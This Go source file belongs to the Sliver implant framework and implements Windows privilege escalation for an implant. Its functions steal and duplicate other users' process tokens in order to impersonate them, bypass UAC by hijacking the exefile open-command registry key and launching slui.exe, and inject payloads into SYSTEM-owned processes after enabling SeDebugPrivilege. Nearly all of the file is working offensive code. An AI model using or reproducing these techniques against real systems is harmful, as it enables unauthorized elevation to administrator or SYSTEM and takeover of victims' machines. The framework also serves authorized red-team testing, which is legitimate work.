// +build windows

package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}
	"log"
	// {{end}}
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"

	"github.com/bishopfox/sliver/sliver/ps"
	"github.com/bishopfox/sliver/sliver/taskrunner"
)

const (
	SecurityAnonymous                  = 0
	SecurityIdentification             = 1
	SecurityImpersonation              = 2
	SecurityDelegation                 = 3
	TokenPrimary             TokenType = 1
	TokenImpersonation       TokenType = 2
	STANDARD_RIGHTS_REQUIRED           = 0x000F
	SYNCHRONIZE                        = 0x00100000
	THREAD_ALL_ACCESS                  = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xffff
	TOKEN_ADJUST_PRIVILEGES            = 0x0020
	SE_PRIVILEGE_ENABLED               = 0x00000002
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

type TokenType uint32

func duplicateTokenEx(hExistingToken syscall.Token, dwDesiredAccess uint32, lpTokenAttributes *syscall.SecurityAttributes, impersonationLevel uint32, tokenType TokenType, phNewToken *syscall.Token) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procDuplicateTokenEx := modadvapi32.MustFindProc("DuplicateTokenEx")
	r1, _, err := procDuplicateTokenEx.Call(uintptr(hExistingToken), uintptr(dwDesiredAccess), uintptr(unsafe.Pointer(lpTokenAttributes)), uintptr(impersonationLevel), uintptr(tokenType), uintptr(unsafe.Pointer(phNewToken)))
	if r1 != 0 {
		return nil
	}
	return
}

func adjustTokenPrivileges(token syscall.Token, disableAllPrivileges bool, newstate *TOKEN_PRIVILEGES, buflen uint32, prevstate *TOKEN_PRIVILEGES, returnlen *uint32) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.MustFindProc("AdjustTokenPrivileges")
	var _p0 uint32
	if disableAllPrivileges {
		_p0 = 1
	} else {
		_p0 = 0
	}
	r0, _, e1 := procAdjustTokenPrivileges.Call(uintptr(token), uintptr(_p0), uintptr(unsafe.Pointer(newstate)), uintptr(buflen), uintptr(unsafe.Pointer(prevstate)), uintptr(unsafe.Pointer(returnlen)))
	if r0 == 0 {
		err = e1
	}
	return err
}

func lookupPrivilegeValue(systemname *uint16, name *uint16, luid *LUID) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procLookupPrivilegeValueW := modadvapi32.MustFindProc("LookupPrivilegeValueW")
	r1, _, e1 := procLookupPrivilegeValueW.Call(uintptr(unsafe.Pointer(systemname)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(luid)))
	if r1 == 0 {
		err = e1
	}
	return
}

func getCurrentThread() (pseudoHandle syscall.Handle, err error) {
	modkernel32 := syscall.MustLoadDLL("kernel32.dll")
	procGetCurrentThread := modkernel32.MustFindProc("GetCurrentThread")
	r0, _, e1 := procGetCurrentThread.Call(0, 0, 0)
	pseudoHandle = syscall.Handle(r0)
	if pseudoHandle == 0 {
		err = e1
	}
	return
}

func openThreadToken(h syscall.Handle, access uint32, openasself bool, token *syscall.Token) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procOpenThreadToken := modadvapi32.MustFindProc("OpenThreadToken")
	var _p0 uint32
	if openasself {
		_p0 = 1
	} else {
		_p0 = 0
	}
	r1, _, e1 := procOpenThreadToken.Call(uintptr(h), uintptr(access), uintptr(_p0), uintptr(unsafe.Pointer(token)), 0, 0)
	if r1 == 0 {
		err = e1
	}
	return
}

func impersonateLoggedOnUser(hToken syscall.Token) (err error) {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procImpersonateLoggedOnUser := modadvapi32.MustFindProc("ImpersonateLoggedOnUser")
	r1, _, err := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if r1 != 0 {
		return nil
	}
	return
}

func revertToSelf() error {
	modadvapi32 := syscall.MustLoadDLL("advapi32.dll")
	procRevertToSelf := modadvapi32.MustFindProc("RevertToSelf")
	r1, _, err := procRevertToSelf.Call()
	if r1 != 0 {
		return nil
	}
	return err
}

func sePrivEnable(s string) error {
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	err = lookupPrivilegeValue(nil, syscall.StringToUTF16Ptr(s), &luid)
	if err != nil {
		// {{if .Debug}}
		log.Println("LookupPrivilegeValueW failed", err)
		// {{end}}
		return err
	}
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	err = adjustTokenPrivileges(tokenHandle, false, &privs, 0, nil, nil)
	if err != nil {
		// {{if .Debug}}
		log.Println("AdjustTokenPrivileges failed", err)
		// {{end}}
		return err
	}
	return nil
}

func getPrimaryToken(pid uint32) (*syscall.Token, error) {
	handle, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// {{if .Debug}}
		log.Println("OpenProcess failed")
		// {{end}}
		return nil, err
	}
	defer syscall.CloseHandle(handle)
	var token syscall.Token
	if err = syscall.OpenProcessToken(handle, syscall.TOKEN_DUPLICATE|syscall.TOKEN_ASSIGN_PRIMARY|syscall.TOKEN_QUERY, &token); err != nil {
		// {{if .Debug}}
		log.Println("OpenProcessToken failed")
		// {{end}}
		return nil, err
	}
	return &token, err
}

func enableCurrentThreadPrivilege(privilegeName string) error {
	ct, err := getCurrentThread()
	if err != nil {
		// {{if .Debug}}
		log.Println("GetCurrentThread failed", err)
		// {{end}}
		return err
	}
	var t syscall.Token
	err = openThreadToken(ct, syscall.TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, true, &t)
	if err != nil {
		// {{if .Debug}}
		log.Println("openThreadToken failed", err)
		// {{end}}
		return err
	}
	defer syscall.CloseHandle(syscall.Handle(t))

	var tp TOKEN_PRIVILEGES

	privStr, err := syscall.UTF16PtrFromString(privilegeName)
	if err != nil {
		return err
	}
	err = lookupPrivilegeValue(nil, privStr, &tp.Privileges[0].Luid)
	if err != nil {
		// {{if .Debug}}
		log.Println("lookupPrivilegeValue failed")
		// {{end}}
		return err
	}
	tp.PrivilegeCount = 1
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	return adjustTokenPrivileges(t, false, &tp, 0, nil, nil)
}

func impersonateProcess(pid uint32) (newToken syscall.Token, err error) {
	var attr syscall.SecurityAttributes
	var requiredPrivileges = []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege"}
	primaryToken, err := getPrimaryToken(pid)

	if err != nil {
		// {{if .Debug}}
		log.Println("getPrimaryToken failed:", err)
		// {{end}}
		return
	}
	defer primaryToken.Close()

	err = impersonateLoggedOnUser(*primaryToken)
	if err != nil {
		// {{if .Debug}}
		log.Println("impersonateLoggedOnUser failed:", err)
		// {{end}}
		return
	}
	err = duplicateTokenEx(*primaryToken, syscall.TOKEN_ALL_ACCESS, &attr, SecurityDelegation, TokenPrimary, &newToken)
	if err != nil {
		// {{if .Debug}}
		log.Println("duplicateTokenEx failed:", err)
		// {{end}}
		return
	}
	for _, priv := range requiredPrivileges {
		err = enableCurrentThreadPrivilege(priv)
		if err != nil {
			// {{if .Debug}}
			log.Println("Failed to set priv", priv)
			// {{end}}
			return
		}
	}
	return
}

func impersonateUser(username string) (token syscall.Token, err error) {
	if username == "" {
		err = fmt.Errorf("username can't be empty")
		return
	}
	p, err := ps.Processes()
	if err != nil {
		return
	}
	for _, proc := range p {
		if proc.Owner() == username {
			token, err = impersonateProcess(uint32(proc.Pid()))
			// {{if .Debug}}
			log.Printf("[%d] %s\n", proc.Pid(), proc.Executable())
			// {{end}}
			if err == nil {
				// {{if .Debug}}
				log.Println("Got system token for process", proc.Pid(), proc.Executable())
				// {{end}}
				return
			}
		}
	}
	revertToSelf()
	err = fmt.Errorf("Could not acquire a token belonging to %s", username)
	return
}

func createRegistryKey(keyPath string) error {
	_, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}

	return nil
}

func deleteRegistryKey(keyPath, keyName string) (err error) {
	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	err = registry.DeleteKey(key, keyName)
	return
}

func bypassUAC(command string) (err error) {
	regKeyStr := `Software\Classes\exefile\shell\open\command`
	createRegistryKey(regKeyStr)
	key, err := registry.OpenKey(registry.CURRENT_USER, regKeyStr, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	command = "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -c " + command
	err = key.SetStringValue("", command)
	if err != nil {
		return
	}
	shell32 := syscall.MustLoadDLL("Shell32.dll")
	shellExecuteW := shell32.MustFindProc("ShellExecuteW")
	runasStr, _ := syscall.UTF16PtrFromString("runas")
	sluiStr, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\slui.exe`)
	r1, _, err := shellExecuteW.Call(uintptr(0), uintptr(unsafe.Pointer(runasStr)), uintptr(unsafe.Pointer(sluiStr)), uintptr(0), uintptr(0), uintptr(1))
	if r1 < 32 {
		return
	}
	// Wait for the command to trigger
	time.Sleep(time.Second * 3)
	// Clean up
	// {{if .Debug}}
	log.Println("cleaning the registry up")
	// {{end}}
	err = deleteRegistryKey(`Software\Classes\exefile\shell\open`, "command")
	err = deleteRegistryKey(`Software\Classes\exefile\shell\`, "open")
	return
}

// RunProcessAsUser - Retrieve a primary token belonging to username
// and starts a new process using that token.
func RunProcessAsUser(username, command, args string) (out string, err error) {
	go func(out string) {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		token, err := impersonateUser(username)
		if err != nil {
			// {{if .Debug}}
			log.Println("Could not impersonate user", username)
			// {{end}}
			return
		}
		cmd := exec.Command(command, args)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			Token: token,
		}
		// {{if .Debug}}
		log.Printf("Starting %s as %s\n", command, username)
		// {{end}}
		output, err := cmd.Output()
		if err != nil {
			// {{if .Debug}}
			log.Println("Command failed:", err)
			// {{end}}
			return
		}
		out = string(output)
	}(out)
	return
}

// Elevate - Starts a new sliver session in an elevated context
// Uses the slui UAC bypass
func Elevate() (err error) {
	processName, _ := os.Executable()
	err = bypassUAC(processName)
	if err != nil {
		// {{if .Debug}}
		log.Println("BypassUAC failed:", err)
		// {{end}}
	}
	return
}

// GetSystem starts a new RemoteTask in a SYSTEM owned process
func GetSystem(data []byte, hostingProcess string) (err error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	procs, _ := ps.Processes()
	for _, p := range procs {
		if p.Executable() == hostingProcess {
			err = sePrivEnable("SeDebugPrivilege")
			if err != nil {
				// {{if .Debug}}
				log.Println("sePrivEnable failed:", err)
				// {{end}}
				return
			}
			err = taskrunner.RemoteTask(p.Pid(), data)
			if err != nil {
				// {{if .Debug}}
				log.Println("RemoteTask failed:", err)
				// {{end}}
				return
			}
			break
		}
	}
	return
}
